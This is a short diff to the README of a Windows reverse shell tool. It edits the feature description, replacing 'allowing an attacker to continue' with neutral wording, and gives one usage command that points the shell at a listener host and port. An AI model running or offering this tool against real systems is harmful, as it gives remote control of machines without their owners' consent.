@@ -1,5 +1,5 @@
 # windows-rev-shell
-An advanced windows reverse shell. Allows to specify the type of shell (cmd or powershell), can be programmed to automatically attempt to reconnect and can be spawned as subprocess allowing an attacker to continue 
+An advanced windows reverse shell. Allows to specify the type of shell (cmd or powershell), can be programmed to automatically attempt to reconnect and can be spawned as subprocess to prevent blocking the terminal
 ## Usage
 One shot <br>
 `shell.exe LHOST LPORT <cmd|powershell> 0` <br>
